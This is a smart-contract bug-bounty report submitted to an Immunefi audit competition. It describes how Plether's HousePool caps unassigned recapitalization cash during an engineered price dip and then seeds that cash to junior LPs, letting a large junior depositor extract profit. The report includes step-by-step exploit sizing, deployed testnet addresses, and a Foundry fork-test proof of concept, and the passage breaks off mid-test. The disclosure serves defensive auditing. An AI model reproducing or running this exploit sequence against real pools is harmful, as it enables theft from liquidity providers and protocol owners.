# \#98992 [SC-Medium] Unassigned cash is capped by an unrealized loss, then seeded to junior

**Submitted on Nov 11th 2026 at 10:55:49 UTC by @Omisanin0 for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98992
- **Report Type:** Smart Contract
- **Report severity:** Medium
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

Recapitalization above the senior high-water mark is stored in `unassignedAssets`. The accounting spec says that balance is left out of the equity comparison. `planReconcile` caps the stored balance down to distributable assets while a negative terminal delta is on the book. The tokens stay in the pool. `absorbLoss` then wipes junior and senior principal and leaves the high-water mark where it is. A zero-quote junior redeem is enough epoch progress to keep the cap. When the long is closed flat, the delta comes back and the capped unassigned does not. The next settle takes the zero-principal seed. Senior is filled only up to the old high-water mark. The rest is junior principal, and the junior redeem pays it out.

On the deployed Arbitrum Sepolia v2.0.0 book, with the launch risk parameters already set, this run removed 103,011,998.238449 USDG from the unassigned label and paid the attacker 68,553,307.894544 USDG more than they deposited and posted as margin. The high-water mark did not fall. After the flat close the unassigned balance was still the capped number, and it was still that number after the redeem.

## Vulnerability Details

`ACCOUNTING_SPEC.md` step 2 says to compare terminal equity with total principal, and to leave reserved pending inflows and `unassignedAssets` out of that comparison. Step 3 charges a shortfall to junior, then senior, and says losses do not reduce the senior high-water mark. Step 4 routes surplus to the high-water mark first, then to junior. Value with no claimant path is supposed to stay in `unassignedAssets`.

`HousePoolAccountingLib.buildReconcileSnapshot` sets distributable to physical assets, plus a positive terminal delta, minus trader claims, minus the absolute value of a negative terminal delta. It does not subtract `unassignedAssets`. The subtraction happens later, and it writes storage.

`HousePoolReconcilePlanLib.planReconcile` snapshots `claimedEquityZero` from senior principal plus junior principal before it touches unassigned (`HousePoolReconcilePlanLib.sol:62`). It then sets

```text
unassigned = min(unassigned, distributable)
```

at lines 73-74. If both principals are still nonzero, line 62 is false, so the function does not take the seed. It computes `distributableToClaims` as `distributable - unassigned` after that cap. When the negative delta is large enough that distributable has fallen to the capped unassigned, `distributableToClaims` is 0. `HousePoolWaterfallAccountingLib.absorbLoss` (`HousePoolWaterfallAccountingLib.sol:167-184`) then wipes junior and senior. It does not write the high-water mark.

The dip itself does not move cash. `_reconcile` runs at the start of `_settleLpEpoch`, before redemption funding. `totalAssets` stays `min(token balance, accountedAssets)`. The loss is a terminal-book number. A queued redeem that now quotes zero still counts as epoch progress: the vault refunds the shares (`HousePool.sol` zero-quote path, then the progress check near line 1183). If that redeem were absent, `HousePool__NoLpEpochProgress` would revert the settle and the cap would roll back with it.

The flat close zeros the attacker's price delta. Stored unassigned stays at the capped value. `getFreeAssets` reserves the stored unassigned number, the max-profit envelope, and trader claims. During the dip the long's max-profit reserve still consumes the freed slice. After the close that reserve is gone, and the withdrawal snapshot is reserving the capped unassigned rather than the old one, so the capped slice is free cash.

The next settle sees both principals at 0. Line 62 is now true. Lines 76-80 seed `distributable - unassigned` through `applyRevenueIntent` with claimed-equity credit disabled. Senior is restored only up to the high-water mark that `absorbLoss` left alone. The remainder is junior principal, provided junior supply is nonzero. The attacker still has the shares, because the dip redeem was refunded. `_reconcile` books that principal before the vault prices the redemption, so the redeem is paid on the seeded number.

This is the gap-0 recap path. `applyClaimantRecapitalizationIntent` (`HousePoolPendingPreviewLib.sol:111-137`) sends the recap to unassigned when senior is at the high-water mark and both principals are nonzero. The empty-book branch, which replaces the high-water mark, is a different bug. It fires only if the recap is still pending when the wipe happens. Here the recap is settled into unassigned first, while both principals are nonzero, in an epoch that has progress.

The function comment on `planReconcile` states the two steps this run uses. With a fresh mark, unassigned is capped to remaining distributable value. If claimed principal is zero, the remaining distributable value is seeded through the pending-revenue rules (`HousePoolReconcilePlanLib.sol:35-38`). `ACCOUNTING_SPEC.md` line 327 also says seeded ownership continuity is preferred over governance re-assignment. A reader who stops on that comment can call the cap and the seed the rule.

That reading assigns the wrong cash. The cap is a one-way `min`. It only lowers the stored label. After the flat close the mark is back at the index, `totalAssets` is 2,123,006,990.859056, and that cash is still larger than the pre-dip unassigned balance of 1,805,571,392.518176. The label stays at 1,702,559,394.279727. A cap that tracked remaining distributable value would have let the label back up once the cash covered it again. The next settle does not. Both principals are zero, so lines 76-80 seed `distributable - unassigned` using the already reduced label. The 103,011,998.238449 that left the label is inside that seed.

Continuity of the wiped book would put senior back at the old high-water mark and put the other juniors back at the principal they already had. It would not pay them more. Spec line 315 and line 357 keep value with no claimant path in `unassignedAssets`, and a depositor does not acquire that value by holding shares. Spec lines 336-340 leave unassigned out of the equity comparison, so the shortfall is charged to principal and the unassigned balance does not move. On that rule the recovery is the wiped principal: senior up to the high-water mark, junior up to what was wiped, and the recap still unassigned.

The run splits those amounts. Of the 1,805,571,392.518176 recap, 1,702,559,394.279727 is still unassigned after the redeem. Senior finishes at 11,119,149.050776, the high-water mark from the dip, inside 1,000 USDG of the pre-dip mark. The junior balance left in the vault, which is the other holders after the attacker redeems, is 135,121,583.704301 against 102,034,940.678089 at the start. That increase is their share of the capped cash. The test requires it.

A long profits when the oracle price falls. The dip is an LP loss on that long. It is not a liquidation of the attacker. The open is a real `OrderRouter.commitOrder` plus `executeOrder`. The dip and the recovery are real `OrderRouter.settleLpEpoch` calls. The owner call is `CfdEngine.recapitalizePool`, which pulls USDG into the pool. That is the documented way surplus above the senior high-water mark becomes unassigned. The owner is the victim of the cap.

The live book already had open interest, so the long has to be large enough to clear principal after the existing book's delta at the dip price. `terminalLpPriceDeltaAssetAtoms` on the deployed book, read before the open, was -7,247,204.767754 USDG at the 0.40 basket. The 6,899,431 lot long is what takes the settled delta to -421,213,085.466047 USDG. The 0.40 skew cap on that size is why the owner recap is 1,805,571,392.518176 USDG. That cash is depth. After the attack, 1,702,559,394.279727 USDG of it is still labeled unassigned. The cap removed the other 103,011,998.238449 USDG from the label. An empty book hits the same lines with a much smaller recap. This run is the deployed book, skew and all.

The basket print is 39,999,997 because a print near 1.00 cannot wipe this principal under the launch skew cap. `CfdEnginePlanLib` sets `maxSkewAssets` to net depth times `maxSkewRatio` (`CfdEnginePlanLib.sol:473`). Net depth is physical assets minus trader claims (`PositionRiskAccountingLib.computeNetPoolDepthAssets`). Unassigned cash counts in that depth and does not count as principal. A long's loss is about its notional times the move, and the notional cannot exceed the skew cap, so the loss cannot exceed about 0.4 times depth times the move. Depth beyond principal is the recap. After the junior deposit, claimed principal is about 316 million. At a 1% move the recap has to be on the order of 250 times that principal, about 80 billion USDG, before a skew-capped long can push the loss through it. A 5% move still needs a recap of about 15 billion. The 0.40 print is the one that keeps the recap at 1.81 billion, the same order of magnitude as the book. A closer print is the same bug with a larger owner deposit. It does not become a different accounting path.

Deposits are refused once unassigned or a pending recap bucket is nonzero. The junior deposit is therefore requested and settled before `recapitalizePool`. The one-hour cooldown then elapses, the owner funds the pool, and a 10 USDG junior redeem is queued only so that epoch has progress. That small redeem is claimed at the end. It is a return of deposit. Claiming it before the dip request would reset `lastDepositTime` and block the zero-quote redeem.

The router locks the open execution bounty from free settlement before it locks `marginDelta`. On this deployment the bounty is capped at 0.200000 USDG. The clearinghouse deposit is the 5% margin plus that bounty. `marginDelta` on the order is the margin alone.

## Impact Details

Impact: direct theft of user funds, at rest, other than unclaimed yield. Critical.

The stolen USDG is recapitalization cash sitting in HousePool. The cap deletes the unassigned label on 103,011,998.238449 USDG while the tokens remain in the contract. The zero-equity seed writes that amount into principal. Senior is restored to its own high-water mark. Junior holders are paid the rest in proportion to shares. The attacker held about two thirds of junior supply, redeemed, and finished 68,553,307.894544 USDG ahead of the cash they put in.

The run uses the parameters already stored on the Arbitrum Sepolia deployment: `vpiFactor` `0.01e18`, `maxSkewRatio` `0.4e18`, initial margin 20 bps, maintenance 10 bps. Settlement token is the deployed MockUSDG at `0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D`, 6 decimals. At 1 USDG = $1, the figures below are the dollar amounts. Perps is not on Arbitrum One, so this is the measured loss on this book.

| Item | USDG |
|---|---:|
| Attacker junior deposit | 204,069,881.356178 |
| Margin posted | 34,497,155.000000 |
| Open bounty posted | 0.200000 |
| Contributed | 238,567,036.556178 |
| Owner recap, routed entirely to unassigned | 1,805,571,392.518176 |
| Unassigned removed by the dip and not restored | 103,011,998.238449 |
| Junior redeem paid to the attacker | 273,176,832.896255 |
| Small redeem paid to the attacker | 9.999996 |
| Attacker ending balance | 307,120,344.450722 |
| Attacker profit | 68,553,307.894544 |

The ending balance includes the margin that came back. Clearinghouse balance at the end is 0. Net trading drag is 553,653.445529 USDG, which is the 34,497,155.000000 margin minus the 33,943,501.554471 that the withdraw added to the wallet on top of the two redeems. Open and close execution fee is 4 bps each way on a 689,943,100 USDG notional. VPI charged on the open is rebated on the flat close. The close reduced pool cash by 765,488.886718 USDG. That rebate is the trader's own charge. It is well under half of the capped slice, and the dip itself did not change `totalAssets` (2,123,772,479.745774 before and after).

Junior principal just before the dip was 305,008,843.500390. The seed then paid the attacker 273,176,832.896255 and left 135,121,583.704301 in the vault. Sum of those two is 408,298,416.600556. The amount of junior principal above the pre-dip balance is 103,289,573.100166. That equals the capped 103,011,998.238449, plus the net fee the round trip left in the pool (1,043,165.292247 inflow on the open, minus 765,488.886718 rebate on the close), minus the 101.543812 coupon that raised senior principal and the high-water mark together before the wipe. The other junior holders were left with 135,121,583.704301 against a pre-attack junior principal of 102,034,940.678089. Their gain is their share of the same capped cash. The attacker sized the deposit to take the larger share.

Free cash after the flat close was 379,503,717.677819. That is what funded the redeem. Unassigned after the redeem was still 1,702,559,394.279727.

Gas printed by the test was 10,643,331. Forge metered the test call at 8,515,631. Either figure is a few dollars on Arbitrum at ordinary prices. The position stays open across one LP hour. The paying redeem is a later hour, after the one hour deposit cooldown that the share refund resets.

## References

- `packages/perps/ACCOUNTING_SPEC.md` lines 315, 327, 336-340, and 357. Step 2 excludes `unassignedAssets` from the equity comparison. Value with no claimant path stays there. A depositor does not acquire it by holding shares. Line 327 prefers seeded ownership continuity over governance re-assignment of a wiped book. That continuity restores the wiped principal. It does not assign the quarantined recap.
- `packages/perps/src/libraries/HousePoolReconcilePlanLib.sol`: the function comment at lines 35-38 states the cap and the zero-principal seed. `claimedEquityZero` is line 62, the cap is lines 73-74, and the seed is lines 76-80. The cap only lowers the stored label.
- `packages/perps/src/libraries/CfdEnginePlanLib.sol` line 473 and `packages/perps/src/libraries/PositionRiskAccountingLib.sol` `computeNetPoolDepthAssets`. Skew is 40% of physical assets minus trader claims. That bound is why the dip basket is 0.40.
- `packages/perps/src/libraries/HousePoolAccountingLib.sol`: `buildReconcileSnapshot` lines 60-77. Distributable subtracts the absolute negative delta. It does not subtract unassigned.
- `packages/perps/src/libraries/HousePoolWaterfallAccountingLib.sol`: `absorbLoss` lines 167-184. Principal is wiped. The high-water mark is not.
- `packages/perps/src/libraries/HousePoolPendingPreviewLib.sol`: `applyClaimantRecapitalizationIntent` lines 111-137 routes a recap to unassigned when senior is at the high-water mark. `applyRevenueIntent` lines 158-187 is the seed. The empty-book high-water replacement is a different path and is not this run.
- `packages/perps/src/HousePool.sol`: `_settleLpEpoch` reconciles before it funds redemptions. The zero-quote refund counts as progress, so `HousePool__NoLpEpochProgress` does not roll the cap back. `getFreeAssets` lines 1235-1254.
- `packages/perps/src/TerminalNavBookV2.sol`: `_terminalLpPriceDeltaAssetAtoms` lines 320-349. A lower print on a long is a negative LP delta.
- `packages/perps/src/OrderRouter.sol`: `commitOrder` line 85, `executeOrder` line 240, `updateMarkPrice` line 429, `settleLpEpoch` line 479.
- `packages/perps/src/CfdEngine.sol`: `recapitalizePool` lines 632-653. Owner pulls USDG into the pool and records a claimant inflow.
- `packages/perps/src/PletherOracle.sol`: `_resolveHistoricalOrderBasket` lines 596-643, `_resolveCurrentBasket` lines 749-800. Order window 15 seconds. Mark and settle window is the last 15 seconds.
- Source pin `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. The Sepolia bytecode under test is the v2.0.0 deployment. `packages/perps/src` at that pin matches the deployed source commit.

## Proof of Concept

## Proof of Concept

Run from `src/packages/perps` (`foundry.toml`: solc 0.8.35, via-IR, optimizer runs 200). Forge on this machine is 1.5.1-stable. No private key and no Pyth API key.

```bash
cd src/packages/perps
ARB_SEPOLIA_RPC_URL=https://sepolia-rollup.arbitrum.io/rpc \
forge test --match-contract UnassignedRoundTripCaptureForkTest -vv
```

`ARB_SEPOLIA_RPC_URL` defaults to `https://sepolia-rollup.arbitrum.io/rpc`. `F669_FORK_BLOCK` defaults to 0, which forks the latest block the node still serves. The passing run did that. Timestamp 1794393919. Foundry reports `block.number` as the Arbitrum L1 block, 12111242 on this run. The test does not require `block.number` to equal an L2 pin, and it does not require senior, junior, or unassigned to equal one historical triple. It logs the book it forked. This run's book was senior 11,112,650.853906 at the high-water mark, junior 102,034,940.678089, unassigned 0. An earlier head at timestamp 1794392538 had the same three balances. `cast find-block 1794392538` on that RPC returns L2 block 328159251. The public node drops historical state, so that block is optional. Set `F669_FORK_BLOCK` only when the node still serves it. If a later book has unassigned already set, senior impaired, trading inactive, or an order queue, the test reverts and names that precondition. A book that still meets them runs the same path and prints its own amounts.

Chain id 421614. In-scope contracts are the deployed ones. No in-scope file is edited. Nothing in scope is redeployed or etched.

| Contract | Address |
|---|---|
| CfdEngine | `0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA` |
| HousePool | `0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e` |
| Junior vault | `0x4A8b67184a1E3224c11A191cc69F22C50EEf734e` |
| PletherOracle | `0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2` |
| OrderRouter | `0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444` |
| MarginClearinghouse | `0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A` |
| TerminalNavBookV2 | `0x61C7f7Cf91c295a86250E1e05a91901e8E1e51A3` |
| MockUSDG | `0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D` |
| Pyth | `0x0B73614636C855Bf23F342F307FB981A3e47f42B` |

The owner read from `engine.owner()` is `0x5a71a4094Ec81165Ada48AA4c27dA48ec27E0d6B`. The test pranks that address for `recapitalizePool` only.

Pyth in the test is `MockPyth` from `packages/shared/test-support`, etched at the oracle's existing Pyth address after `new MockPyth()` is deployed on the fork. The program allows a Pyth stand-in. A signed Hermes update was not available, and the test does not invent one. The payload is `abi.encode(FeedUpdate[])` with exponent -8 and confidence 0. The six feed ids, bases, weights, and inversions are read from the deployed oracle. The quoted basket was 100,000,000 at the index and 39,999,997 at the dip. `setFee(0)` makes the update fee 0. The calls still read `getUpdateFee` and pass `msg.value`. USDG is the deployed MockUSDG. The test calls its existing `mint`. It does not deploy a second settlement token.

Foundry does not implement ArbSys. `ArbitrumForkSupport.install()` etches the repo's `ForkArbSys` at address 100. That shim returns `block.number` and nothing else, so `vm.roll` still separates the commit block from the execute block. No other precompile is etched. No engine, router, pool, vault, or book is mocked. Marks go through `router.updateMarkPrice`. Settles go through `router.settleLpEpoch`. Opens and the close go through `router.commitOrder` and `router.executeOrder`. The test checks `ExecutionResult.status == Executed`.

The order queue at the pin was empty (`nextExecuteId` 0, `globalTailOrderId` 0), so the attacker's commit is the head. Junior and senior redeem and deposit queue heads were 0. The whole warp stays on Wednesday 11 November 2026, and the test reverts if `isOracleFrozen` or `isFadWindow` becomes true.

Steps:

1. Fork latest. Require chain id 421614, trading active, unassigned 0, senior equal to a positive high-water mark, junior principal above 0, and an empty order queue. On this run those balances were senior 11,112,650.853906, junior 102,034,940.678089, unassigned 0. Etch MockPyth. Publish the index basket through `router.updateMarkPrice`. The engine mark becomes 100,000,000.
2. `requestDeposit` of 204,069,881.356178 USDG into the junior vault, twice the live junior principal. Warp to that LP epoch and `router.settleLpEpoch` at the same basket. Claim the shares: 205,660,874,001,389,362. Junior principal is now 305,009,056.584302. Senior is still at its high-water mark.
3. After the one hour cooldown, the owner calls `recapitalizePool(1,805,571,392.518176)`. The attacker queues a redeem of about 10 USDG of shares so the epoch has progress, and does not claim it yet. `router.settleLpEpoch` at the index. Unassigned becomes 1,805,571,392.518176, the whole recap. Both principals are still nonzero. Senior principal plus a 1,000 USDG tolerance still covers the high-water mark. Pending recap is 0.
4. Deposit 34,497,155.200000 USDG to the clearinghouse (margin plus the 0.200000 bounty). `commitOrder` a long of 6,899,431 lots (`size` 689,943,100e18), target price 1, margin delta 34,497,155.000000. Two seconds and one `vm.roll` later, `executeOrder` with a unique payload whose publish time is inside `(commitTime, commitTime + 15s]`. Status is Executed. Entry price 100,000,000. Max profit 689,943,100.000000. Position size matches.
5. `requestRedeem` the entire remaining junior balance. Warp to that epoch. `router.settleLpEpoch` at the dip basket 39,999,997. `claimRedeemRefund` returns every share that was queued. Senior principal is 0. Junior principal is 0. High-water mark is 11,119,149.050776, above the pre-dip mark. `totalAssets` is unchanged at 2,123,772,479.745774. Unassigned is 1,702,559,394.279727. The cap removed 103,011,998.238449. Terminal delta at the dip is -421,213,085.466047.
6. `commitOrder` and `executeOrder` close the full long at the index basket. Target price is `CAP_PRICE`. Size is 0. Unassigned is still 1,702,559,394.279727. Terminal delta is back to -1,030,030.927997, the pre-existing book at the index. Pool cash falls by the 765,488.886718 VPI rebate. `getFreeAssets` is 379,503,717.677819.
7. The refund set `lastDepositTime`. After one hour plus one second, `requestRedeem` all shares again. `router.settleLpEpoch` at the index. The seed runs before the redeem is funded. `claimRedeem` pays 273,176,832.896255. The earlier 10 USDG redeem pays 9.999996. `withdraw` takes the clearinghouse balance to the wallet. Unassigned is still 1,702,559,394.279727. Senior principal equals the high-water mark, 11,119,149.050776. Junior principal left in the vault is 135,121,583.704301.

The test requires the wipe, the unchanged high-water mark, the cash-neutral dip, the cap above half of the 50,000,000 USDG surplus it sized for, the unassigned balance frozen across the close, and pool cash after that close still above the pre-dip unassigned label. It requires free cash above half the cap, a nonzero exit, senior restored to the high-water mark and within 1,000 USDG of the pre-dip mark, the junior balance left in the vault above the starting junior principal, and `ending > contributed`.

```text
fork timestamp 1794393919
vpiFactor 10000000000000000
maxSkewRatio 400000000000000000
initMarginBps 20
indexPrice 100000000
dipPrice 39999997
preDipDelta -7247204767754
deposit 204069881356178
recap 1805571392518176
margin 34497155000000
openBounty 200000
lots 6899431
notional 689943100000000
entryPrice 100000000
maxProfit 689943100000000
cappedAway 103011998238449
senior after dip 0
junior after dip 0
hwm after dip 11119149050776
unassigned after dip 1702559394279727
totalAssets after dip 2123772479745774
terminalDelta at dip -421213085466047
unassigned after close 1702559394279727
closeRebate 765488886718
freeAfterClose 379503717677819
exitAssets 273176832896255
smallRedeemAssets 9999996
unassigned after exit 1702559394279727
senior after exit 11119149050776
junior left 135121583704301
passiveJuniorLeft 135121583704301
contributed 238567036556178
wallet 307120344450722
clearing 0
ending 307120344450722
profit 68553307894544
fundsAtRiskCappedUnassigned 103011998238449
gas 10643331
```

Full test, `src/packages/perps/test/perps/poc/UnassignedRoundTripCaptureFork.t.sol`:

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {ArbitrumForkSupport} from "@plether/test-utils/ArbitrumForkSupport.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {Test} from "forge-std/Test.sol";
import {console2} from "forge-std/console2.sol";

/// @notice Fork PoC for F-669 on the Arbitrum Sepolia v2.0.0 deployment.
/// @dev Plether accepts a local fork and mocks only for Pyth and USDG. This test forks the
///      deployed in-scope contracts, etches MockPyth at the oracle's Pyth address, and mints the
///      deployed MockUSDG. It does not redeploy or etch any in-scope contract.
///      Foundry does not implement ArbSys. `ArbitrumForkSupport` etches address(100) with a shim
///      whose only behavior is `arbBlockNumber() = block.number`, so `vm.roll` preserves the
///      same-L2-block check. No other precompile is etched.
///
///      Run from `src/packages/perps` (do not broadcast):
///      ARB_SEPOLIA_RPC_URL=https://sepolia-rollup.arbitrum.io/rpc \
///      forge test --match-contract UnassignedRoundTripCaptureForkTest -vv
///      The public rollup node prunes older account state. The default pin is the latest block.
///      Set F669_FORK_BLOCK to a still-served L2 block to reproduce a specific pin.
///      setUp does not pin senior, junior, or unassigned to one block's atoms. The attack requires
///      trading active, unassigned zero, senior equal to a positive high-water mark, and an empty
///      order queue. Deposit, long, and recap are sized from that book.
contract UnassignedRoundTripCaptureForkTest is Test {

    /// @dev Zero selects the latest block the RPC still serves.
    uint256 internal constant FORK_BLOCK = 0;
    uint256 internal constant INDEX_TARGET = 100_000_000;
    uint256 internal constant DIP_TARGET = 40_000_000;
    uint256 internal constant SURPLUS = 50_000_000e6;
    uint256 internal constant CHAINLINK_TO_TOKEN_SCALE = 1e10;
    uint256 internal constant LOT = 1e20;

    address internal constant ENGINE = 0xcA18a6783D7542F9D2F28F4f259772b74C4D6bAA;
    address internal constant POOL = 0xeB5604c393843B2f3c347Ec24Fa9dDaD6Ab2131e;
    address internal constant JUNIOR = 0x4A8b67184a1E3224c11A191cc69F22C50EEf734e;
    address internal constant ORACLE = 0x4f2c62A0E03657F52C633c19c11f88d8F0897Bb2;
    address internal constant ROUTER = 0x918663D6Da8CB33b325a04c4A5e8c51D42F3b444;
    address internal constant CLEARING = 0xB5B851f627d6Df3CF3F096E23e20a58884D7b89A;
    address internal constant BOOK = 0x61C7f7Cf91c295a86250E1e05a91901e8E1e51A3;
    address internal constant USDG = 0x3d051DbBf5Ff427a4aE8Ad09746902666Af8FB9D;
    address internal constant EXPECTED_PYTH = 0x0B73614636C855Bf23F342F307FB981A3e47f42B;

    IEngine internal constant engine = IEngine(ENGINE);
    IPool internal constant pool = IPool(POOL);
    IJunior internal constant junior = IJunior(JUNIOR);
    IOracle internal constant oracle = IOracle(ORACLE);
    IRouter internal constant router = IRouter(ROUTER);
    IClearing internal constant clearing = IClearing(CLEARING);
    IBook internal constant book = IBook(BOOK);
    IMintUSDG internal constant usdg = IMintUSDG(USDG);

    address internal attacker;
    address internal owner;
    address internal pythAddr;

    uint256 internal feedCount;
    bytes32[8] internal feedIds;
    uint256[8] internal bases;
    uint256[8] internal weights;
    bool[8] internal inverted;
    int64[8] internal indexRaw;
    int64[8] internal dipRaw;

    uint256 internal indexPrice;
    uint256 internal dipPrice;
    uint256 internal depositAssets;
    uint256 internal recapAssets;
    uint256 internal marginAssets;
    uint256 internal openBountyAssets;
    uint256 internal openSize;
    uint256 internal contributed;
    uint256 internal hwmBeforeDip;
    uint256 internal assetsBeforeDip;
    uint256 internal unassignedBeforeDip;
    uint256 internal unassignedAfterDip;
    uint256 internal cappedAway;
    uint256 internal juniorAtStart;
    uint256 internal gasStart;

    function setUp() public {
        string memory rpc = vm.envOr("ARB_SEPOLIA_RPC_URL", string("https://sepolia-rollup.arbitrum.io/rpc"));
        uint256 pin = vm.envOr("F669_FORK_BLOCK", FORK_BLOCK);
        if (pin == 0) {
            vm.createSelectFork(rpc);
        } else {
            vm.createSelectFork(rpc, pin);
        }
        require(block.chainid == 421_614, "Arbitrum Sepolia chain id");
        // Foundry reports the L1 block in `block.number` on this Arbitrum fork. The attack does not
        // require one historical senior, junior, and unassigned triple. It logs the book it forked.
        console2.log("fork L1 block.number", block.number);
        console2.log("fork L2 pin", pin);
        console2.log("fork timestamp", vm.getBlockTimestamp());
        console2.log("fork senior", pool.seniorPrincipal());
        console2.log("fork junior", pool.juniorPrincipal());
        console2.log("fork hwm", pool.seniorHighWaterMark());
        console2.log("fork unassigned", pool.unassignedAssets());
        require(POOL.code.length > 1000, "pool code");
        require(ENGINE.code.length > 1000, "engine code");
        require(ROUTER.code.length > 1000, "router code");

        // ArbSys precompile shim. Returns Foundry block.number and nothing else.
        ArbitrumForkSupport.install();

        pythAddr = oracle.pyth();
        require(pythAddr == EXPECTED_PYTH, "pyth address");
        require(engine.settlementToken() == USDG, "settlement token");
        MockPyth impl = new MockPyth();
        vm.etch(pythAddr, address(impl).code);
        MockPyth pyth = MockPyth(pythAddr);
        pyth.setFee(0);
        pyth.setUpdateFailure(false, false, bytes32(0));
        pyth.setFailUpdateAtCall(0);
        pyth.setSynchronizeLegacyUniquePrices(false);
        require(pyth.mockFee() == 0 && !pyth.failUpdate() && !pyth.skipUpdate(), "pyth mock storage");

        _loadFeeds();
        for (uint256 i; i < feedCount; ++i) {
            pyth.setPrice(feedIds[i], int64(1), uint64(0), int32(-8), 1);
            (,,, uint256 stored) = IPythView(pythAddr).getPriceUnsafe(feedIds[i]);
            require(stored == 1, "feed not seeded");
        }

        attacker = makeAddr("f669-attacker");
        owner = engine.owner();
        require(owner != address(0), "owner");
        vm.deal(attacker, 1 ether);
        vm.deal(address(this), 1 ether);
    }

    function test_fork_unassignedCapSeedsJunior() public {
        gasStart = gasleft();
        _prepareSizes();
        _mintAndApprove();

        console2.log("STEP 0 fork");
        _logState();
        require(pool.isTradingActive(), "trading inactive");
        require(!engine.degradedMode(), "degraded");
        require(!engine.isOracleFrozen() && !engine.isFadWindow(), "market closed");
        require(pool.unassignedAssets() == 0, "unassigned already set");
        require(pool.seniorPrincipal() == pool.seniorHighWaterMark() && pool.seniorPrincipal() > 0, "senior not at hwm");
        require(pool.juniorPrincipal() > 0, "no junior principal");
        require(router.globalTailOrderId() == 0 && router.nextExecuteId() == 0, "order queue not empty");
        juniorAtStart = pool.juniorPrincipal();
        console2.log("juniorAtStart", juniorAtStart);

        _publish(indexRaw);
        require(engine.lastMarkPrice() == indexPrice, "index basket mismatch");

        uint256 depositEpoch = _requestDeposit();
        _settleDeposit(depositEpoch);
        uint256 mintedShares = _claimDeposit(depositEpoch);
        require(mintedShares > 0 && junior.balanceOf(attacker) == mintedShares, "no junior shares");
        _requireSizeStillEnough();
        console2.log("STEP 1 junior deposit settled");
        console2.log("attackerShares", mintedShares);
        _logState();

        _warpToRedeemable();
        vm.prank(owner);
        engine.recapitalizePool(recapAssets);
        require(pool.pendingRecapitalizationAssets() == recapAssets, "recap not pending");
        uint256 smallShares = junior.estimateWithdrawShares(10e6);
        require(smallShares > 0 && smallShares < junior.balanceOf(attacker) / 2, "small redeem size");
        vm.prank(attacker);
        uint256 recapEpoch = junior.requestRedeem(smallShares, attacker, attacker);
        _settleThrough(recapEpoch, indexRaw, 0);
        console2.log("STEP 2 recap routed to unassigned");
        console2.log("recap", recapAssets);
        _logState();
        require(pool.unassignedAssets() * 100 >= recapAssets * 99, "recap did not reach unassigned");
        require(pool.seniorPrincipal() > 0 && pool.juniorPrincipal() > 0, "principals already zero");
        require(pool.seniorHighWaterMark() > 0, "hwm missing before dip");
        require(pool.seniorPrincipal() + 1000e6 >= pool.seniorHighWaterMark(), "senior impaired before dip");

        _openLong();
        console2.log("STEP 3 long opened");
        _logState();
        (uint256 size,, uint256 entryPrice, uint256 maxProfit,,,) = engine.positions(attacker);
        require(size == openSize, "open size");
        console2.log("entryPrice", entryPrice);
        console2.log("maxProfit", maxProfit);

        uint256 dipShares = junior.balanceOf(attacker);
        vm.prank(attacker);
        uint256 dipEpoch = junior.requestRedeem(dipShares, attacker, attacker);
        hwmBeforeDip = pool.seniorHighWaterMark();
        assetsBeforeDip = pool.totalAssets();
        unassignedBeforeDip = pool.unassignedAssets();
        _settleThrough(dipEpoch, dipRaw, dipEpoch);
        uint256 refunded = _claimRefund(dipEpoch);
        require(refunded == dipShares, "zero-quote refund");
        require(junior.balanceOf(attacker) == dipShares, "shares not returned");
        unassignedAfterDip = pool.unassignedAssets();
        cappedAway = unassignedBeforeDip - unassignedAfterDip;
        console2.log("STEP 4 dip settle wiped claimants");
        console2.log("cappedAway", cappedAway);
        console2.log("refundedShares", refunded);
        _logState();
        require(pool.seniorPrincipal() == 0, "senior not wiped");
        require(pool.juniorPrincipal() == 0, "junior not wiped");
        require(pool.seniorHighWaterMark() >= hwmBeforeDip && pool.seniorHighWaterMark() > 0, "hwm reduced");
        require(pool.totalAssets() == assetsBeforeDip, "dip moved cash");
        require(cappedAway > SURPLUS / 2, "cap too small");

        _closeLong();
        console2.log("STEP 5 flat close");
        _logState();
        (size,,,,,,) = engine.positions(attacker);
        require(size == 0, "position still open");
        require(pool.unassignedAssets() == unassignedAfterDip, "close restored unassigned");
        // The flat close pays the open VPI back to the trader. That rebate is the trader's own
        // charge. The dip did not move cash, and this rebate is far smaller than the capped slice.
        uint256 assetsAfterClose = pool.totalAssets();
        uint256 closeRebate = assetsBeforeDip > assetsAfterClose ? assetsBeforeDip - assetsAfterClose : 0;
        console2.log("closeRebate", closeRebate);
        require(closeRebate * 2 < cappedAway, "close paid the capped slice");
        require(pool.getFreeAssets() > cappedAway / 2, "capped cash not free");
        // The cap is a one-way min(). Cash again covers the pre-dip unassigned label, and the
        // label is not restored. A mark-to-market of that label would have released it.
        require(pool.totalAssets() > unassignedBeforeDip, "cash does not cover old unassigned");
        console2.log("freeAfterClose", pool.getFreeAssets());

        _warpToRedeemable();
        uint256 exitShares = junior.balanceOf(attacker);
        vm.prank(attacker);
        uint256 exitEpoch = junior.requestRedeem(exitShares, attacker, attacker);
        _settleThrough(exitEpoch, indexRaw, 0);
        uint256 exitAssets = _claimRedeem(exitEpoch, exitShares);
        uint256 smallAssets = _claimRedeem(recapEpoch, smallShares);
        _withdrawMargin();
        console2.log("STEP 6 recovery redeem");
        console2.log("exitAssets", exitAssets);
        console2.log("smallRedeemAssets", smallAssets);
        _logState();
        require(pool.unassignedAssets() < unassignedBeforeDip, "unassigned restored");
        require(exitAssets > 0, "exit paid nothing");
        // Continuity of the wiped book would restore senior to the old high-water mark and would
